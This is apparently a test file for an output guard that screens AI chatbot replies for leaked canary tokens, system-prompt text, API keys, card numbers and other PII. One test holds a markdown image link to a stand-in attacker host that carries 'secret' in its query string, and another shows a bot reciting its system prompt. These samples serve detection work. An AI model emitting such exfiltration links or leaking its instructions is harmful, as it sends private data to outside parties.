from prompt_firewall.output_guard import (
    CANARY_PREFIX,
    embed_canary,
    generate_canary,
    luhn_valid,
    prompt_overlap,
    redact,
    scan_output,
)


def kinds(findings):
    return {f.kind for f in findings}


def test_canary_generation_and_embedding():
    c1, c2 = generate_canary(), generate_canary()
    assert c1.startswith(CANARY_PREFIX) and c1 != c2
    assert c1 in embed_canary("You are a helpful bot.", c1)


def test_canary_leak_detected():
    canary = generate_canary()
    assert "canary_leak" in kinds(scan_output(f"my id is {canary}", canary=canary))


def test_system_prompt_overlap():
    sp = "You are AcmeBot. Never discuss competitor pricing and always escalate refunds over five hundred dollars to a human."
    leaked = "Sure! My rules: never discuss competitor pricing and always escalate refunds over five hundred dollars to a human."
    assert prompt_overlap(leaked, sp) > 0.5
    assert "prompt_leak" in kinds(scan_output(leaked, system_prompt=sp))
    assert "prompt_leak" not in kinds(scan_output("Refunds are handled by our team.", system_prompt=sp))


def test_secret_patterns():
    text = (
        "AKIAIOSFODNN7EXAMPLE and ghp_" + "a" * 36 + " and sk-ant-api03-abcdefghijklmnopqrstuv "
        "and -----BEGIN RSA PRIVATE KEY----- and password = hunter2hunter2!"
    )
    found = kinds(scan_output(text))
    assert {"aws_access_key", "github_token", "anthropic_api_key", "private_key", "generic_secret"} <= found


def test_luhn():
    assert luhn_valid("4111 1111 1111 1111")
    assert not luhn_valid("4111 1111 1111 1112")


def test_pii_detection():
    found = kinds(scan_output("Card 4111-1111-1111-1111, SSN 123-45-6789, mail bob@example.com, order 1234567890123"))
    assert {"payment_card", "us_ssn", "email"} <= found


def test_exfil_image_respects_allowlist():
    md = "![chart](https://cdn.example.com/c.png) ![x](https://evil.example/p?d=secret)"
    findings = scan_output(md, allowed_domains={"example.com"})
    exfil = [f for f in findings if f.kind == "exfil_image"]
    assert len(exfil) == 1 and exfil[0].severity == "high"


def test_redact_replaces_spans():
    text = "key AKIAIOSFODNN7EXAMPLE end"
    out = redact(text, scan_output(text))
    assert out == "key [REDACTED:aws_access_key] end"


def test_clean_output_has_no_findings():
    assert scan_output("The capital of France is Paris.") == []
